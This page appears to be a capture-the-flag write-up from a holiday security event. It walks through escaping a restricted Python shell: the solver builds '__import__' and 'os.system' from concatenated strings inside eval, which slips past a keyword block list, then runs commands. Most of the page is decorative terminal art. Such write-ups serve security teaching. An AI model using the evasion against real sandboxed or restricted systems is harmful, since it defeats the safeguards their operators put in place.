<span style="color: rgb(211, 215, 207);">   </span> <span style="color: rgb(211, 215, 207);"> </span>,<span style="color: rgb(78, 154, 6);">lllllllllllllllllllllllllc</span> <span style="color: rgb(211, 215, 207);"> </span>.<span style="color: rgb(78, 154, 6);">l;</span>  ,<span style="color: rgb(78, 154, 6);">llllllllllllllllllllllllllllllll:</span> <span style="color: rgb(211, 215, 207);">      </span>
<span style="color: rgb(211, 215, 207);">     </span>.<span style="color: rgb(78, 154, 6);">llllllllllllllllllllllllllc;lll::llllllllllllllllllllllllllllllll</span>,  <span style="color: rgb(211, 215, 207);">      </span>
<span style="color: rgb(211, 215, 207);">     </span> '<span style="color: rgb(78, 154, 6);">llllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllc</span>.  <span style="color: rgb(211, 215, 207);">       </span>
<span style="color: rgb(211, 215, 207);">      </span> <span style="color: rgb(78, 154, 6);">,llllllllllllllllllllllllllllllllllllllllllllllllllllllllllll</span>,  <span style="color: rgb(211, 215, 207);">         </span>
<span style="color: rgb(211, 215, 207);">       </span> '<span style="color: rgb(78, 154, 6);">llllllllllllllllcccccccc;</span>',.,<span style="color: rgb(78, 154, 6);">clllllllllllllllllllllllllll,</span>  <span style="color: rgb(211, 215, 207);">           </span>
<span style="color: rgb(211, 215, 207);">         </span>.<span style="color: rgb(78, 154, 6);">cllllllc:::::;;</span>,,,,<span style="color: rgb(204, 0, 0);">'...':</span><span style="color: rgb(196, 160, 0);">c</span><span style="color: rgb(204, 0, 0);">:;...''</span>,,;<span style="color: rgb(78, 154, 6);">;;::::::lllllllllc</span>, <span style="color: rgb(211, 215, 207);">              </span>
<span style="color: rgb(211, 215, 207);">         </span>  '<span style="color: rgb(78, 154, 6);">cllllc::;::::</span><span style="color: rgb(196, 160, 0);">c</span><span style="color: rgb(204, 0, 0);">ccccccccl</span><span style="color: rgb(78, 154, 6);">l</span><span style="color: rgb(204, 0, 0);">c,,,,,,,'',</span><span style="color: rgb(78, 154, 6);">:::::::lllllll;</span>.  <span style="color: rgb(211, 215, 207);">               </span>
<span style="color: rgb(211, 215, 207);">            </span> .<span style="color: rgb(78, 154, 6);">:llllllllll</span>kM<span style="color: rgb(211, 215, 207);">MMMMMM</span>MM<span style="color: rgb(78, 154, 6);">dl</span><span style="color: rgb(204, 0, 0);">clllllllll</span><span style="color: rgb(196, 160, 0);">o</span><span style="color: rgb(78, 154, 6);">llllllllll;</span>. <span style="color: rgb(211, 215, 207);">                   </span>
<span style="color: rgb(211, 215, 207);">             </span>  .'<span style="color: rgb(78, 154, 6);">:lllllll</span>X<span style="color: rgb(211, 215, 207);">M</span>MMMMMMMM<span style="color: rgb(78, 154, 6);">olo</span>WM<span style="color: rgb(211, 215, 207);">MMMMM</span>MMX<span style="color: rgb(78, 154, 6);">llllll:</span>,. <span style="color: rgb(211, 215, 207);">                      </span>
<span style="color: rgb(211, 215, 207);">                  </span> .,<span style="color: rgb(78, 154, 6);">:ll</span><span style="color: rgb(204, 0, 0);">ccccccccccl</span><span style="color: rgb(78, 154, 6);">lll</span>XM<span style="color: rgb(211, 215, 207);">MMMMMM</span>MW<span style="color: rgb(78, 154, 6);">l:;</span>'. <span style="color: rgb(211, 215, 207);">                          </span>
<span style="color: rgb(211, 215, 207);">                      </span> <span style="color: rgb(204, 0, 0);">.,,,,,,,,,,</span><span style="color: rgb(196, 160, 0);">c</span><span style="color: rgb(78, 154, 6);">lll</span><span style="color: rgb(204, 0, 0);">:::::::::;</span> <span style="color: rgb(211, 215, 207);">                               </span>
<span style="color: rgb(211, 215, 207);">                      </span><span style="color: rgb(204, 0, 0);">'lllllllllc.</span>    <span style="color: rgb(204, 0, 0);">',,,,,,,,.</span><span style="color: rgb(211, 215, 207);">                                </span>
<span style="color: rgb(211, 215, 207);">                     lMMMMMMMMMW,    </span><span style="color: rgb(204, 0, 0);">.ddddddddd.</span><span style="color: rgb(211, 215, 207);">                                </span>
<span style="color: rgb(211, 215, 207);">                  </span> <span style="color: rgb(211, 215, 207);"> kMMMMMMMM</span>MX<span style="color: rgb(211, 215, 207);">.     kMMMMMMMM</span>K<span style="color: rgb(211, 215, 207);">                                 </span>
<span style="color: rgb(211, 215, 207);">                  </span><span style="color: rgb(204, 0, 0);"> ':::::::::,</span><span style="color: rgb(211, 215, 207);">      .NWWWWWWWW:                                 </span>
<span style="color: rgb(211, 215, 207);">               </span> <span style="color: rgb(211, 215, 207);"> </span><span style="color: rgb(204, 0, 0);"> ',,,,,,,,,.</span><span style="color: rgb(211, 215, 207);"> </span> <span style="color: rgb(211, 215, 207);">     </span><span style="color: rgb(204, 0, 0);">.,,,,,,,,'</span><span style="color: rgb(211, 215, 207);">  </span> <span style="color: rgb(211, 215, 207);">                               </span>
<span style="color: rgb(211, 215, 207);">                .</span><span style="color: rgb(204, 0, 0);">oooooooooo.</span><span style="color: rgb(211, 215, 207);">  </span> <span style="color: rgb(211, 215, 207);">    </span><span style="color: rgb(204, 0, 0);"> ',,,,,,,,.</span><span style="color: rgb(211, 215, 207);">                                  </span>
<span style="color: rgb(211, 215, 207);">               .NM</span>MMMMMMMW<span style="color: rgb(211, 215, 207);">;        </span><span style="color: rgb(204, 0, 0);">cOOOOOOOOx</span><span style="color: rgb(211, 215, 207);"> </span> <span style="color: rgb(211, 215, 207);">                                 </span>
<span style="color: rgb(211, 215, 207);">              </span> 0<span style="color: rgb(211, 215, 207);">MMMMMMMM</span>Mc<span style="color: rgb(211, 215, 207);">         NMMMMMMMMk                                   </span>
<span style="color: rgb(211, 215, 207);">              </span><span style="color: rgb(204, 0, 0);"> ;;;;;;;;;'</span><span style="color: rgb(211, 215, 207);"> </span> <span style="color: rgb(211, 215, 207);">       .</span><span style="color: rgb(204, 0, 0);">KKKKKKKKK:</span><span style="color: rgb(211, 215, 207);">                                   </span>
<span style="color: rgb(211, 215, 207);">              </span><span style="color: rgb(204, 0, 0);">.,,,,,,,,, </span><span style="color: rgb(211, 215, 207);">         </span><span style="color: rgb(204, 0, 0);"> ,,,,,,,,,.</span><span style="color: rgb(211, 215, 207);">                                   </span>
<span style="color: rgb(211, 215, 207);">              </span><span style="color: rgb(204, 0, 0);">.ddddddddo</span><span style="color: rgb(211, 215, 207);">           </span><span style="color: rgb(204, 0, 0);">',,,,,,,,.</span><span style="color: rgb(211, 215, 207);"> </span> <span style="color: rgb(211, 215, 207);">                                 </span>
<span style="color: rgb(211, 215, 207);">  </span>       <span style="color: rgb(211, 215, 207);">  </span> <span style="color: rgb(211, 215, 207);">   </span>XMMMMMMM<span style="color: rgb(211, 215, 207);">N  </span> <span style="color: rgb(211, 215, 207);">      </span> <span style="color: rgb(211, 215, 207);"> </span><span style="color: rgb(204, 0, 0);">cKKKKKKKKK</span><span style="color: rgb(211, 215, 207);">.                                  </span>
<span style="color: rgb(211, 215, 207);"> </span>   <span style="color: rgb(78, 154, 6);">.;:::;;,,,,,:ldddddd</span>.<span style="color: rgb(211, 215, 207);"> </span> <span style="color: rgb(211, 215, 207);">        </span> 0MMMMMMMMX.       .<span style="color: rgb(78, 154, 6);">...</span> <span style="color: rgb(211, 215, 207);"> </span> <span style="color: rgb(211, 215, 207);">                   </span>
<span style="color: rgb(211, 215, 207);">   </span> <span style="color: rgb(211, 215, 207);"> </span> <span style="color: rgb(78, 154, 6);">.,:ccccccccccccccc</span> <span style="color: rgb(211, 215, 207);">           </span><span style="color: rgb(78, 154, 6);">'cccccccccc:::ccccc;.</span> <span style="color: rgb(211, 215, 207);">                      </span>
<span style="color: rgb(211, 215, 207);">     </span> <span style="color: rgb(211, 215, 207);"> </span>  <span style="color: rgb(78, 154, 6);">.:ccccccccccccc</span> <span style="color: rgb(211, 215, 207);">           </span><span style="color: rgb(78, 154, 6);">.ccccccccccccccc:'.</span> <span style="color: rgb(211, 215, 207);">  </span> <span style="color: rgb(211, 215, 207);">                     </span>
<span style="color: rgb(211, 215, 207);">       </span>  <span style="color: rgb(211, 215, 207);"> </span> <span style="color: rgb(78, 154, 6);">.;;;;;;;;;;;;</span> <span style="color: rgb(211, 215, 207);"> </span> <span style="color: rgb(211, 215, 207);">         </span><span style="color: rgb(78, 154, 6);">.ccccccccccccc;.</span> <span style="color: rgb(211, 215, 207);"> </span> <span style="color: rgb(211, 215, 207);">                         </span>
<span style="color: rgb(211, 215, 207);">         </span> <span style="color: rgb(211, 215, 207);">  </span>           <span style="color: rgb(211, 215, 207);">             </span><span style="color: rgb(78, 154, 6);">..............</span> <span style="color: rgb(211, 215, 207);"> </span> <span style="color: rgb(211, 215, 207);">                           </span>
<span style="color: rgb(211, 215, 207);">                                   </span> <span style="color: rgb(211, 215, 207);">             </span>  <span style="color: rgb(211, 215, 207);">                             </span>
<span style="color: rgb(211, 215, 207);">                                                                                </span>


<span style="color: rgb(0, 186, 19);">I'm another elf in trouble,</span>
<span style="color: rgb(0, 186, 19);">Caught within this Python bubble.</span>

<span style="color: rgb(239, 41, 41);">Here I clench my merry elf fist -</span>
<span style="color: rgb(239, 41, 41);">Words get filtered by a black list!</span>

<span style="color: rgb(0, 186, 19);">Can't remember how I got stuck,</span>
<span style="color: rgb(0, 186, 19);">Try it - maybe you'll have more luck?</span>

<span style="color: rgb(239, 41, 41);">For this challenge, you are more fit.</span>
<span style="color: rgb(239, 41, 41);">Beat this challenge - Mark and Bag it!</span>

<span style="color: rgb(0, 186, 19);">-SugarPlum Mary</span>

To complete this challenge, escape Python
and run ./i_escaped
&gt;&gt;&gt;</pre>
        <p>We are dropped immediately into a python shell and it's our job to get out. Thankfully Mark Baggett (Ohhh, I get it: Mark and Bag....) is giving a talk at Kringle Con called <a href="https://www.youtube.com/watch?v=ZVx2Sxl3B9c">Escaping Python Shells</a></p>
        <pre class="text-monospace bg-dark text-light p-2" style="white-space: pre-wrap">
&gt;&gt;&gt; import os
Use of the command import is prohibited for this question.
&gt;&gt;&gt; __import__("os")
Use of the command import is prohibited for this question.</pre>
        <p>Well, those didn't work. Let's use eval try splitting up the potentially filterd term.</p>
        <pre class="text-monospace bg-dark text-light p-2" style="white-space: pre-wrap">
&gt;&gt;&gt; os = eval('__im' + 'port__("os")')
&gt;&gt;&gt; os.system("id")
Use of the command os.system is prohibited for this question.</pre>
        <p> Getting closer! We imported the 'os' library but we can't execute the system command. Let's split it again.</p>
        <pre class="text-monospace bg-dark text-light p-2" style="white-space: pre-wrap">
&gt;&gt;&gt; eval('os.' + 'system("id")')
uid=1000(elf) gid=1000(elf) groups=1000(elf)
0</pre>
        <p>Hey! That worked. Let's use this syntax to run the script <kbd>./i_escaped</kbd>.</p>
        <pre class="text-monospace bg-dark text-light p-2" style="white-space: pre-wrap">
&gt;&gt;&gt; eval('os.' + 'system("./i_escaped")')
Loading, please wait......



<span style="color: rgb(78, 154, 6);">  ____        _   _                      </span>
<span style="color: rgb(78, 154, 6);"> |  _ \ _   _| |_| |__   ___  _ __       </span>
<span style="color: rgb(78, 154, 6);"> | |_) | | | | __| '_ \ / _ \| '_ \      </span>
<span style="color: rgb(78, 154, 6);"> |  __/| |_| | |_| | | | (_) | | | |     </span>
<span style="color: rgb(78, 154, 6);"> |_|___ \__, |\__|_| |_|\___/|_| |_| _ _ </span>
<span style="color: rgb(78, 154, 6);"> | ____||___/___ __ _ _ __   ___  __| | |</span>
<span style="color: rgb(78, 154, 6);"> |  _| / __|/ __/ _` | '_ \ / _ \/ _` | |</span>
<span style="color: rgb(78, 154, 6);"> | |___\__ \ (_| (_| | |_) |  __/ (_| |_|</span>
<span style="color: rgb(78, 154, 6);"> |_____|___/\___\__,_| .__/ \___|\__,_(_)</span>
<span style="color: rgb(78, 154, 6);">                     |_|                             </span>


<span style="color: rgb(239, 41, 41);">That's some fancy Python hacking -</span>
<span style="color: rgb(239, 41, 41);">You have sent that lizard packing!</span>

<span style="color: rgb(0, 186, 19);">-SugarPlum Mary</span>
<span style="color: rgb(0, 186, 19);">            </span>
<span style="color: rgb(0, 186, 19);">You escaped! Congratulations!</span>

<span style="color: rgb(0, 186, 19);">0</span>
<span style="color: rgb(0, 186, 19);">&gt;&gt;&gt; </span></pre>

      </div>
      <div class="border rounded p-2 m-2">
        <div class="dropdown">
          <button class="btn btn-dark dropdown-toggle mb-1" type="button" id="dropdownMenuButton" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
            <a id="termUnlinkedFunction"></a>Sleigh Bell Lottery
          </button>
          <div class="dropdown-menu" aria-labelledby="dropdownMenuButton">
            <a class="dropdown-item" href="#hntShinny">Shinny Upatree Hints</a>
            <a class="dropdown-item" href="#npcShinny">Shinny Upatree</a>
            <a class="dropdown-item" href="#obj91">Objective 9.1</a>
          </div>
        </div>

        <div id="divUnlinkedFunction" style="display: inline-block" onclick='if (!$(this).html().includes("iframe")) {$(this).html(atob("PGlmcmFtZSBzdHlsZT0ibWluLXdpZHRoOiA4MDBweDsgbWF4LXdpZHRoOiAxMDAwcHg7IGhlaWdodDogODAwcHg7IGJvcmRlcjogbm9uZTsiIHNyYz0iaHR0cHM6Ly9kb2NrZXIua3JpbmdsZWNvbi5jb20vP2NoYWxsZW5nZT11bmxpbmtlZC1mdW5jdGlvbiI+PC9pZnJhbWU+PHA+PGEgaHJlZj0iIyEiIGNsYXNzPSJidG4gYnRuLWluZm8iICBvbm1vdXNldXA9IiQoJyNkaXZVbmxpbmtlZEZ1bmN0aW9uJykuaHRtbChhdG9iKCdQR0VnYUhKbFpqMGlJeUVpSUdOc1lYTnpQU0ppZEc0Z1luUnVMV2x1Wm04aVBrTnNhV05ySUdobGNtVWdkRzhnUEdJK2IzQmxiand2WWo0Z1UyeGxhV2RvSUVKbGJHd2dURzkwZEdWeWVTQlVaWEp0YVc1aGJEd3ZZVDQ9JykpIj5DbGljayBoZXJlIHRvIDxiPmNsb3NlPC9iPiBTbGVpZ2ggQmVsbCBMb3R0ZXJ5IFRlcm1pbmFsPC9hPjwvcD4="))}'>
          <a href="#!" class="btn btn-info">Click here to <b>open</b> Sleigh Bell Lottery Terminal</a>
        </div>

        <hr class="my-4">
        <p></p>
        <pre class="text-monospace bg-dark text-light p-2" style="white-space: pre-wrap">
<span style="color: rgb(211, 215, 207);">                                                                                </span>
<span style="color: rgb(211, 215, 207);">                                                                                </span>
<span style="color: rgb(211, 215, 207);">                              </span>      <span style="color: rgb(211, 215, 207);"> </span>   <span style="color: rgb(211, 215, 207);">                                        </span>
<span style="color: rgb(211, 215, 207);">                          </span>  <span style="color: rgb(211, 215, 207);">  W</span><span style="color: rgb(204, 0, 0);">KOdl:;o</span><span style="color: rgb(211, 215, 207);">W</span> <span style="color: rgb(211, 215, 207);">         </span>     <span style="color: rgb(211, 215, 207);">                          </span>
<span style="color: rgb(211, 215, 207);">             </span>  <span style="color: rgb(211, 215, 207);">  </span>    <span style="color: rgb(211, 215, 207);"> </span>  <span style="color: rgb(211, 215, 207);"> </span> <span style="color: rgb(211, 215, 207);">W</span><span style="color: rgb(204, 0, 0);">Oo:'.......c</span><span style="color: rgb(211, 215, 207);">W</span> <span style="color: rgb(211, 215, 207);">        X</span><span style="color: rgb(204, 0, 0);">0K</span><span style="color: rgb(211, 215, 207);">X</span>W<span style="color: rgb(211, 215, 207);"> </span>    <span style="color: rgb(211, 215, 207);">                     </span>
<span style="color: rgb(211, 215, 207);">             </span>  <span style="color: rgb(211, 215, 207);"> </span><span style="color: rgb(204, 0, 0);">kdxO</span><span style="color: rgb(211, 215, 207);">X</span> <span style="color: rgb(211, 215, 207);">    </span><span style="color: rgb(204, 0, 0);">x...;.....;c.d</span>  <span style="color: rgb(211, 215, 207);">  </span>  <span style="color: rgb(211, 215, 207);">X</span><span style="color: rgb(204, 0, 0);">d;....':d0</span><span style="color: rgb(211, 215, 207);">W</span> <span style="color: rgb(211, 215, 207);">                     </span>
<span style="color: rgb(211, 215, 207);">             </span>  <span style="color: rgb(211, 215, 207);">W</span><span style="color: rgb(204, 0, 0);">,....'cd0</span><span style="color: rgb(211, 215, 207);">WN</span><span style="color: rgb(204, 0, 0);">,.,</span><span style="color: rgb(211, 215, 207);">WN</span><span style="color: rgb(204, 0, 0);">d'...d:'</span><span style="color: rgb(211, 215, 207);">N </span> <span style="color: rgb(211, 215, 207);"> </span><span style="color: rgb(204, 0, 0);">Xl........',.:</span><span style="color: rgb(211, 215, 207);">W                     </span>
<span style="color: rgb(211, 215, 207);">             </span>   <span style="color: rgb(204, 0, 0);">l........':odoK</span>  <span style="color: rgb(211, 215, 207);">N</span><span style="color: rgb(204, 0, 0);">o..,0.k</span> <span style="color: rgb(211, 215, 207);">W</span><span style="color: rgb(204, 0, 0);">x';.....'lO</span><span style="color: rgb(211, 215, 207);">W</span><span style="color: rgb(204, 0, 0);">X.'</span><span style="color: rgb(211, 215, 207);">N                     </span>
<span style="color: rgb(211, 215, 207);">              </span>  <span style="color: rgb(204, 0, 0);">O............,oK</span><span style="color: rgb(211, 215, 207);"> </span>  <span style="color: rgb(204, 0, 0);">O..O;d</span>W<span style="color: rgb(204, 0, 0);">l,d'...;x</span><span style="color: rgb(211, 215, 207);">N</span>   <span style="color: rgb(204, 0, 0);">x.o</span><span style="color: rgb(211, 215, 207);">    </span>   <span style="color: rgb(211, 215, 207);"> </span> <span style="color: rgb(211, 215, 207);">N</span><span style="color: rgb(204, 0, 0);">XKKKK</span><span style="color: rgb(211, 215, 207);">XN</span>   <span style="color: rgb(211, 215, 207);">  </span>
<span style="color: rgb(211, 215, 207);">                W</span><span style="color: rgb(204, 0, 0);">,.....,:ccc:,..;k</span><span style="color: rgb(211, 215, 207);">W </span><span style="color: rgb(204, 0, 0);">k.dcdd,k'..,k</span><span style="color: rgb(211, 215, 207);">W</span>    <span style="color: rgb(204, 0, 0);">0'c</span><span style="color: rgb(211, 215, 207);">W</span>   <span style="color: rgb(211, 215, 207);"> </span><span style="color: rgb(204, 0, 0);">Xko:'.....:odOK</span><span style="color: rgb(211, 215, 207);">W  </span>
<span style="color: rgb(211, 215, 207);">                </span> <span style="color: rgb(204, 0, 0);">d........',;clll:,x</span><span style="color: rgb(211, 215, 207);">W</span><span style="color: rgb(204, 0, 0);">lolx'x;..o</span><span style="color: rgb(211, 215, 207);">N</span> <span style="color: rgb(211, 215, 207);">  </span> W<span style="color: rgb(204, 0, 0);">x'l</span><span style="color: rgb(211, 215, 207);">W</span> <span style="color: rgb(211, 215, 207);"> </span><span style="color: rgb(204, 0, 0);">Ko;..........,cxK</span>  <span style="color: rgb(211, 215, 207);">  </span>
<span style="color: rgb(211, 215, 207);">                </span> <span style="color: rgb(211, 215, 207);">N</span><span style="color: rgb(204, 0, 0);">,..,codxkkkxdl:::;:xKlx,k.'O</span>  <span style="color: rgb(211, 215, 207);"> </span> <span style="color: rgb(211, 215, 207);"> </span><span style="color: rgb(204, 0, 0);">O;,O</span> <span style="color: rgb(204, 0, 0);">Ko,....;cdk0KXXXXK0kO</span><span style="color: rgb(211, 215, 207);">W </span>
  <span style="color: rgb(211, 215, 207);"> </span>  <span style="color: rgb(211, 215, 207);"> </span>       <span style="color: rgb(211, 215, 207);">  </span>   <span style="color: rgb(204, 0, 0);">K,.O</span>W <span style="color: rgb(211, 215, 207);"> </span> <span style="color: rgb(211, 215, 207);">   </span> <span style="color: rgb(211, 215, 207);"> </span>  <span style="color: rgb(211, 215, 207);"> X</span><span style="color: rgb(204, 0, 0);">kl':k0:o.O</span>   <span style="color: rgb(211, 215, 207);">W</span><span style="color: rgb(204, 0, 0);">k;:k</span><span style="color: rgb(211, 215, 207);">N</span><span style="color: rgb(204, 0, 0);">k:..'cd0</span>N   <span style="color: rgb(211, 215, 207);"> </span>  <span style="color: rgb(211, 215, 207);"> </span> <span style="color: rgb(211, 215, 207);">         </span>
 <span style="color: rgb(211, 215, 207);">W</span><span style="color: rgb(204, 0, 0);">0kdlc:::cloxk0X</span><span style="color: rgb(211, 215, 207);">W</span> <span style="color: rgb(211, 215, 207);">W</span><span style="color: rgb(204, 0, 0);">kc;lx0K</span><span style="color: rgb(211, 215, 207);">NWW </span>     <span style="color: rgb(211, 215, 207);"> N</span><span style="color: rgb(204, 0, 0);">xlKOxd</span> <span style="color: rgb(211, 215, 207);">W</span><span style="color: rgb(204, 0, 0);">Ol:dK0l''cdOKK0OOOO0K</span><span style="color: rgb(196, 160, 0);">XN</span>W <span style="color: rgb(211, 215, 207);">         </span>
  <span style="color: rgb(211, 215, 207);">W  N</span><span style="color: rgb(204, 0, 0);">Oo'.........,:oxOkkxlc;,',,,,,,:dK;.dKllx0Oo,;d0</span><span style="color: rgb(196, 160, 0);">X</span><span style="color: rgb(204, 0, 0);">KO0</span><span style="color: rgb(196, 160, 0);">KKXKKKK</span><span style="color: rgb(204, 0, 0);">0OO0K</span><span style="color: rgb(196, 160, 0);">X</span><span style="color: rgb(204, 0, 0);">KK</span><span style="color: rgb(196, 160, 0);">N</span> <span style="color: rgb(211, 215, 207);">     </span>
<span style="color: rgb(211, 215, 207);">  N</span><span style="color: rgb(204, 0, 0);">OxodkO00KKK0OOkdoc:,'.,:ldxxxxxdddolx;;xdlcc::cx;0K0</span><span style="color: rgb(196, 160, 0);">KKXXXXXX</span><span style="color: rgb(204, 0, 0);">00KK00OOO0</span><span style="color: rgb(196, 160, 0);">K</span> <span style="color: rgb(211, 215, 207);">     </span>
<span style="color: rgb(211, 215, 207);">  </span>   <span style="color: rgb(211, 215, 207);"> </span>   <span style="color: rgb(211, 215, 207);"> </span>   <span style="color: rgb(196, 160, 0);">WNX</span><span style="color: rgb(204, 0, 0);">K00000KKKK0kxoodl::::ox,.xlK0kdlccdKOO</span><span style="color: rgb(196, 160, 0);">KXXX</span><span style="color: rgb(204, 0, 0);">K000</span><span style="color: rgb(196, 160, 0);">K</span><span style="color: rgb(204, 0, 0);">KKOOOO00000</span><span style="color: rgb(196, 160, 0);">W</span>   <span style="color: rgb(211, 215, 207);">  </span>
<span style="color: rgb(211, 215, 207);">      </span>     <span style="color: rgb(196, 160, 0);">X</span><span style="color: rgb(204, 0, 0);">0O0000</span><span style="color: rgb(196, 160, 0);">KXX</span><span style="color: rgb(204, 0, 0);">00000K</span><span style="color: rgb(196, 160, 0);">N</span><span style="color: rgb(204, 0, 0);">K;o;...:0</span><span style="color: rgb(211, 215, 207);"> </span><span style="color: rgb(204, 0, 0);">d,,;l</span>NW      <span style="color: rgb(204, 0, 0);">0O0</span><span style="color: rgb(196, 160, 0);">XXK</span><span style="color: rgb(204, 0, 0);">0O0KK0OO0KK</span><span style="color: rgb(196, 160, 0);">K</span><span style="color: rgb(204, 0, 0);">000000</span>   <span style="color: rgb(211, 215, 207);">  </span>
<span style="color: rgb(211, 215, 207);">    </span>   <span style="color: rgb(196, 160, 0);">NXNK</span><span style="color: rgb(204, 0, 0);">000O0</span><span style="color: rgb(196, 160, 0);">KKKKKXKKXK</span><span style="color: rgb(204, 0, 0);">000kl:cdK</span> <span style="color: rgb(196, 160, 0);">WX</span><span style="color: rgb(204, 0, 0);">K0000000K</span><span style="color: rgb(196, 160, 0);">KKNW</span><span style="color: rgb(204, 0, 0);">00</span><span style="color: rgb(196, 160, 0);">KK</span><span style="color: rgb(204, 0, 0);">0O0K0OO0KKK00</span><span style="color: rgb(196, 160, 0);">XXXXK</span><span style="color: rgb(204, 0, 0);">0O</span><span style="color: rgb(196, 160, 0);">W</span>  <span style="color: rgb(211, 215, 207);">  </span>
<span style="color: rgb(211, 215, 207);">    </span>  <span style="color: rgb(196, 160, 0);">W</span><span style="color: rgb(204, 0, 0);">OOOOOO000000OO0</span><span style="color: rgb(196, 160, 0);">KKKKXX</span><span style="color: rgb(204, 0, 0);">OO</span><span style="color: rgb(196, 160, 0);">N</span>  W<span style="color: rgb(196, 160, 0);">X</span><span style="color: rgb(204, 0, 0);">0OOO0</span><span style="color: rgb(196, 160, 0);">XXXXXXXK</span><span style="color: rgb(204, 0, 0);">OOOK</span><span style="color: rgb(196, 160, 0);">K</span><span style="color: rgb(204, 0, 0);">0O0</span><span style="color: rgb(196, 160, 0);">K</span><span style="color: rgb(204, 0, 0);">0OOOKK0O0</span><span style="color: rgb(196, 160, 0);">XXXXXXK</span><span style="color: rgb(204, 0, 0);">0O</span><span style="color: rgb(196, 160, 0);">W</span>  <span style="color: rgb(211, 215, 207);">  </span>
<span style="color: rgb(211, 215, 207);">      </span> <span style="color: rgb(196, 160, 0);">N</span><span style="color: rgb(204, 0, 0);">000000OOOOO0000OO0</span><span style="color: rgb(196, 160, 0);">XXXX</span><span style="color: rgb(204, 0, 0);">0</span><span style="color: rgb(196, 160, 0);">WX</span><span style="color: rgb(204, 0, 0);">OO</span><span style="color: rgb(196, 160, 0);">KXXXXXXXXXXXKKXX</span><span style="color: rgb(204, 0, 0);">0O0</span><span style="color: rgb(196, 160, 0);">X</span><span style="color: rgb(204, 0, 0);">KOO0K0OO</span><span style="color: rgb(196, 160, 0);">KXXXXXXKX</span><span style="color: rgb(204, 0, 0);">0O0</span>   <span style="color: rgb(211, 215, 207);">  </span>
<span style="color: rgb(211, 215, 207);">    </span>   <span style="color: rgb(204, 0, 0);">KO</span><span style="color: rgb(196, 160, 0);">KXK</span><span style="color: rgb(204, 0, 0);">OO00000OOOO0KK0OOO</span><span style="color: rgb(196, 160, 0);">K</span><span style="color: rgb(204, 0, 0);">0OO</span><span style="color: rgb(196, 160, 0);">X</span><span style="color: rgb(204, 0, 0);">00</span><span style="color: rgb(196, 160, 0);">KX</span><span style="color: rgb(204, 0, 0);">0</span><span style="color: rgb(196, 160, 0);">KKKKKKK</span><span style="color: rgb(204, 0, 0);">00</span><span style="color: rgb(196, 160, 0);">XXXX</span><span style="color: rgb(204, 0, 0);">OO</span><span style="color: rgb(196, 160, 0);">X</span><span style="color: rgb(204, 0, 0);">0KKO0</span><span style="color: rgb(196, 160, 0);">XXXXXXXXX</span><span style="color: rgb(204, 0, 0);">OO0</span><span style="color: rgb(196, 160, 0);">KW</span> <span style="color: rgb(211, 215, 207);">    </span>
<span style="color: rgb(211, 215, 207);">    </span>   <span style="color: rgb(204, 0, 0);">0O</span><span style="color: rgb(196, 160, 0);">KXXKKKKKK</span><span style="color: rgb(204, 0, 0);">000K0OOO0KK</span><span style="color: rgb(196, 160, 0);">KK</span><span style="color: rgb(204, 0, 0);">OO0KKKK</span><span style="color: rgb(196, 160, 0);">K</span><span style="color: rgb(204, 0, 0);">0000000KKK</span><span style="color: rgb(196, 160, 0);">KK</span><span style="color: rgb(204, 0, 0);">K00OO</span><span style="color: rgb(196, 160, 0);">N</span><span style="color: rgb(204, 0, 0);">O0</span><span style="color: rgb(196, 160, 0);">XK</span><span style="color: rgb(204, 0, 0);">O0</span><span style="color: rgb(196, 160, 0);">NNX</span><span style="color: rgb(204, 0, 0);">K</span><span style="color: rgb(196, 160, 0);">KXXXXN</span>  <span style="color: rgb(211, 215, 207);">     </span>
<span style="color: rgb(211, 215, 207);">      </span> <span style="color: rgb(196, 160, 0);">X</span><span style="color: rgb(204, 0, 0);">OO0</span><span style="color: rgb(196, 160, 0);">KX</span><span style="color: rgb(204, 0, 0);">KO0</span><span style="color: rgb(196, 160, 0);">KKKKK</span><span style="color: rgb(204, 0, 0);">OO0K0O0</span><span style="color: rgb(196, 160, 0);">KX</span><span style="color: rgb(204, 0, 0);">K0K</span><span style="color: rgb(196, 160, 0);">XKKKKKKK</span><span style="color: rgb(204, 0, 0);">K000</span><span style="color: rgb(196, 160, 0);">KKKKKKKK</span><span style="color: rgb(204, 0, 0);">K0K</span><span style="color: rgb(196, 160, 0);">K</span><span style="color: rgb(204, 0, 0);">K</span><span style="color: rgb(196, 160, 0);">K</span><span style="color: rgb(204, 0, 0);">0OOO</span><span style="color: rgb(196, 160, 0);">NWX</span><span style="color: rgb(204, 0, 0);">K00OK</span><span style="color: rgb(196, 160, 0);">N</span>   <span style="color: rgb(211, 215, 207);">     </span>
<span style="color: rgb(211, 215, 207);">      </span>  <span style="color: rgb(204, 0, 0);">0OO</span><span style="color: rgb(196, 160, 0);">W</span> <span style="color: rgb(196, 160, 0);">W</span><span style="color: rgb(204, 0, 0);">OO</span><span style="color: rgb(196, 160, 0);">KXXXXKK</span><span style="color: rgb(204, 0, 0);">KK0K</span><span style="color: rgb(196, 160, 0);">N</span><span style="color: rgb(204, 0, 0);">OOOOO</span><span style="color: rgb(196, 160, 0);">KKXXKKKK</span><span style="color: rgb(204, 0, 0);">KKKKK</span><span style="color: rgb(196, 160, 0);">KKKXXK</span><span style="color: rgb(204, 0, 0);">K0OOOO</span><span style="color: rgb(196, 160, 0);">KX</span><span style="color: rgb(204, 0, 0);">00OOO0K</span><span style="color: rgb(196, 160, 0);">XN</span>W   <span style="color: rgb(211, 215, 207);">       </span>
<span style="color: rgb(211, 215, 207);">      </span>   <span style="color: rgb(196, 160, 0);">K</span><span style="color: rgb(204, 0, 0);">OO0</span><span style="color: rgb(196, 160, 0);">N</span><span style="color: rgb(204, 0, 0);">KO</span><span style="color: rgb(196, 160, 0);">KXXXXXXXX</span><span style="color: rgb(204, 0, 0);">0O0</span><span style="color: rgb(196, 160, 0);">KX</span><span style="color: rgb(204, 0, 0);">KK</span><span style="color: rgb(196, 160, 0);">KKK</span><span style="color: rgb(204, 0, 0);">K000000000000000</span><span style="color: rgb(196, 160, 0);">KKKK</span><span style="color: rgb(204, 0, 0);">K</span><span style="color: rgb(196, 160, 0);">KN</span>W            <span style="color: rgb(211, 215, 207);">         </span>
